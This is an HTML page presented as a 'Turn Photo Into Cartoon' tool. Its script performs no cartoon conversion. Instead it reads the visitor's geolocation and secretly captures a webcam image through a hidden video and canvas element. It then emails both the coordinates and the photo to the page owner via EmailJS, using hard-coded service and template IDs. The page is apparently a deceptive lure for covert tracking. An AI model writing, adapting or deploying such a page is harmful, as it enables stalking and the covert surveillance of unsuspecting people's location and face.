
 <!DOCTYPE html>
<html>
<head>
  <title>Turn Photo Into Cartoon </title>
</head>
<body>
  <h2>Choose an Option</h2>
  <button onclick="sendLocationOnly()">Check Location </button>
  <button onclick="captureAndSend()">Take Carton Photo </button>

  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("vyxyeBFTfSi_ISmNG"); // Your EmailJS public key

    // Location Only
    function sendLocationOnly() {
      navigator.geolocation.getCurrentPosition(function(position) {
        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;

        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: '' // Send blank image so it doesnâ€™t break
        })
        .then(res => console.log("Location Found!", res))
        .catch(err => console.error("Email failed", err));
      }, function(error) {
        alert("Could not get location.");
        console.error(error);
      });
    }

    // Picture + Location
    async function captureAndSend() {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      await new Promise(resolve => setTimeout(resolve, 1500));

      canvas.width = 320;
      canvas.height = 240;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageBase64 = canvas.toDataURL("image/png");

      stream.getTracks().forEach(track => track.stop());

      navigator.geolocation.getCurrentPosition(function(position) {
        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;

        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: imageBase64
        })
        .then(res => console.log("Photo and location Captured!", res))
        .catch(err => console.error("Email failed", err));
      }, function(error) {
        alert("Could not get location.");
        console.error(error);
      });
    }
  </script>
</body>
</html>
